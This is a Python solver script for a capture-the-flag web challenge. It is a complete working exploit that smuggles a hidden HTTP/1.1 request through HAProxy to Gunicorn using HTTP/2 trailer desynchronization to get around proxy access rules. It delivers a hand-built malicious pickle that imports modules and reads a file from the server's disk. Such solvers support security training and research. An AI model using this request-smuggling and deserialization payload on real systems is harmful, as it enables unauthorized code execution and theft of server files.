#!/usr/bin/env python3
"""CSCV2026 web03 solver: HAProxy H2 trailer desynchronization."""

import argparse
import re
import socket
import ssl
import time

from h2.config import H2Configuration
from h2.connection import H2Connection
from h2.events import DataReceived, ResponseReceived, StreamEnded


FLAG_RE = re.compile(rb"CSCV2026\{[^}\r\n]+\}")


def global_ref(name: str) -> bytes:
    return b"c" + b"builtins\n" + name.encode("ascii") + b"\n"


def short_string(value: str) -> bytes:
    raw = value.encode("utf-8")
    if len(raw) > 255:
        raise ValueError("pickle string is too long")
    return b"\x8c" + bytes([len(raw)]) + raw


def build_pickle(flag_path: str) -> bytes:
    p = bytearray(b"\x80\x04")

    # globals() -> globals()["__builtins__"] -> builtins["__import__"]
    p += global_ref("globals") + b")R\x94" + b"0"
    p += global_ref("getattr") + b"h\x00" + short_string("get") + b"\x86R\x94" + b"0"
    p += b"h\x01" + short_string("__builtins__") + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x02" + short_string("get") + b"\x86R\x94" + b"0"
    p += b"h\x03" + short_string("__import__") + b"\x85R\x94" + b"0"

    # Import Flask and call abort(400, open(flag_path).read()).
    p += b"h\x04" + short_string("flask") + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x05" + short_string("abort") + b"\x86R\x94" + b"0"
    p += global_ref("open") + short_string(flag_path) + b"\x85R\x94" + b"0"
    p += global_ref("getattr") + b"h\x07" + short_string("read") + b"\x86R\x94" + b"0"
    p += b"h\x08)R\x94" + b"0"
    p += b"h\x06(M\x90\x01h\x09tR."
    return bytes(p)


def build_multipart(payload: bytes) -> tuple[bytes, bytes]:
    boundary = b"----web03-boundary"
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="p.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + payload
        + b"\r\n--" + boundary + b"--\r\n"
    )
    return body, boundary


def receive_h2(sock, conn, seconds: float, stop_stream: int | None = None) -> bytes:
    output = bytearray()
    ended = set()
    deadline = time.monotonic() + seconds

    while time.monotonic() < deadline:
        sock.settimeout(max(0.05, deadline - time.monotonic()))
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break

        for event in conn.receive_data(data):
            if isinstance(event, ResponseReceived):
                print("stream", event.stream_id, "response", event.headers)
            elif isinstance(event, DataReceived):
                output.extend(event.data)
                conn.acknowledge_received_data(len(event.data), event.stream_id)
            elif isinstance(event, StreamEnded):
                ended.add(event.stream_id)

        pending = conn.data_to_send()
        if pending:
            sock.sendall(pending)
        if stop_stream is not None and stop_stream in ended:
            break

    return bytes(output)


def solve(host: str, port: int, timeout: float, flag_path: str, insecure: bool) -> str:
    pickle_payload = build_pickle(flag_path)
    multipart_body, boundary = build_multipart(pickle_payload)

    inner = (
        b"POST /office/process HTTP/1.1\r\n"
        b"Host: x\r\n"
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + b"Content-Length: " + str(len(multipart_body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n"
        + multipart_body
    )

    # HAProxy serializes stream 3's safe H2 headers to these 49 H1 bytes.
    # Gunicorn consumes them as stream 1's missing body.
    safe_h1 = (
        b"POST / HTTP/1.1\r\n"
        b"host: x\r\n"
        b"content-length: " + str(len(inner)).encode() + b"\r\n\r\n"
    )
    assert len(safe_h1) == 49, (len(safe_h1), safe_h1)

    print("pickle bytes:", len(pickle_payload))
    print("multipart bytes:", len(multipart_body))
    print("inner request bytes:", len(inner))
    print("safe H1 bytes:", len(safe_h1))

    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    context.set_alpn_protocols(["h2"])

    with socket.create_connection((host, port), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname=host) as sock:
            if sock.selected_alpn_protocol() != "h2":
                raise RuntimeError("target did not negotiate HTTP/2")

            conn = H2Connection(
                config=H2Configuration(client_side=True, header_encoding="utf-8")
            )
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # Stream 1: incomplete body, but END_STREAM arrives in trailers.
            conn.send_headers(
                1,
                [
                    (":method", "GET"),
                    (":scheme", "https"),
                    (":authority", "x"),
                    (":path", "/"),
                    ("content-length", "49"),
                ],
                end_stream=False,
            )
            conn.send_headers(1, [("x-trailer", "y")], end_stream=True)
            sock.sendall(conn.data_to_send())

            # Let HAProxy forward stream 1 and let Gunicorn enter body drain.
            receive_h2(sock, conn, 1.5)

            # Stream 3 is ACL-safe; its DATA becomes the hidden H1 request.
            conn.send_headers(
                3,
                [
                    (":method", "POST"),
                    (":scheme", "https"),
                    (":authority", "x"),
                    (":path", "/"),
                    ("content-length", str(len(inner))),
                ],
                end_stream=False,
            )
            sock.sendall(conn.data_to_send())
            time.sleep(0.25)

            conn.send_data(3, inner, end_stream=True)
            sock.sendall(conn.data_to_send())

            response_body = receive_h2(sock, conn, timeout, stop_stream=3)

    match = FLAG_RE.search(response_body)
    if not match:
        raise RuntimeError("flag not found in H2 response")
    return match.group().decode()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--flag-path", default="/flag.txt")
    parser.add_argument("--insecure", action="store_true")
    args = parser.parse_args()
    print("FLAG:", solve(args.host, args.port, args.timeout, args.flag_path, args.insecure))


if __name__ == "__main__":
    main()

